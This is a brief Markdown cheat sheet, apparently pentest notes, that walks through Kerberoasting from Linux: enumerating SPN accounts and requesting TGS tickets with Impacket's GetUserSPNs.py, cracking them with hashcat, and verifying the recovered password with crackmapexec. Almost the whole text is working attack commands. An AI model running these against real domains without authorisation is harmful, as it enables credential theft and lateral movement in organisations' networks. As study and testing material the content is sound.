# Kerberoasting - from Linux

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. 
This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. 
## 1/ Kerberoasting with GetUserSPNs.py
```bash
# First install Impacket toolkit
sudo python3 -m pip install .
```
## 2/ Listing SPN Accounts with GetUserSPNs.py
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username
# we need valid domain credentials and the IP address of a Domain Controller.
``` 
## 3/ Requesting all TGS Tickets
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request 
``` 
## 4/ Requesting a Single TGS ticket
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user targetUser
``` 
## 5/ Saving the TGS Ticket to an Output File
```bash
GetUserSPNs.py -dc-ip 192.168.0.1 MYDOMAIN.LOCAL/username -request-user TargetUser -outputfile TargetUser_tgs
``` 
## 6/ Cracking the Ticket with Hashcat
```bash
hashcat -m 13100 TargetUser_tgs /usr/share/wordlists/rockyou.txt 
``` 
## 7/ Testing Authentication against a Domain Controller
```bash
sudo crackmapexec smb 192.168.0.1 -u TargetUser -p PWDTargetUser
```
